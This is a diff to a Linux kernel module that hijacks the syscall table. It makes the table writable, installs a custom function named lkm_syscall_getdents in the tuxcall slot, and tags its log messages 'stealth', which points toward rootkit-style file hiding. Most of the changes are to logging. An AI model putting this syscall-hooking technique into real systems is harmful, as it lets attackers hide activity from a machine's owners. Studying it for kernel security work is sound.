@@ -19,6 +19,7 @@ MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
 #define SYSCALL_NI __NR_tuxcall
+#define TAG "stealth"
 
 static ulong *syscall_table = NULL;
 static void *original_syscall = NULL;
@@ -63,14 +64,16 @@ static void replace_syscall(ulong offset, ulong func_address)
     syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
 
     if (is_syscall_table(syscall_table)) {
-        printk(KERN_INFO "Syscall table address : %p\n", syscall_table);
+        printk(KERN_INFO "%s: Syscall table address : %p\n", TAG, syscall_table);
         page_read_write((ulong)syscall_table);
         original_syscall = (void *)(syscall_table[offset]);
-        printk(KERN_INFO "Syscall at offset %lu : %p\n", offset, original_syscall);
-        printk(KERN_INFO "Custom syscall address %p\n", lkm_syscall);
+        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
+                original_syscall);
+        printk(KERN_INFO "%s: Custom syscall address %p\n", TAG,
+                (void*)func_address);
         syscall_table[offset] = func_address;
-        printk(KERN_INFO "Syscall hijacked\n");
-        printk(KERN_INFO "Syscall at offset %lu : %p\n", offset,
+        printk(KERN_INFO "%s: Syscall hijacked\n", TAG);
+        printk(KERN_INFO "%s: Syscall at offset %lu : %p\n", TAG, offset,
                 (void *)syscall_table[offset]);
         page_read_only((ulong)syscall_table);
     }
@@ -78,8 +81,8 @@ static void replace_syscall(ulong offset, ulong func_address)
 
 static int init_syscall(void)
 {
-    printk(KERN_INFO "Custom syscall loaded\n");
-    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall);
+    printk(KERN_INFO "%s: Custom syscall loaded\n", TAG);
+    replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_getdents);
     return 0;
 }
 
@@ -88,9 +91,9 @@ static void cleanup_syscall(void)
     page_read_write((ulong)syscall_table);
     syscall_table[SYSCALL_NI] = (ulong)original_syscall;
     page_read_only((ulong)syscall_table);
-    printk(KERN_INFO "Syscall at offset %d : %p\n", SYSCALL_NI,
+    printk(KERN_INFO "%s: Syscall at offset %d : %p\n", TAG, SYSCALL_NI,
             (void *)syscall_table[SYSCALL_NI]);
-    printk(KERN_INFO "Custom syscall unloaded\n");
+    printk(KERN_INFO "%s: Custom syscall unloaded\n", TAG);
 }
 
 module_init(init_syscall);
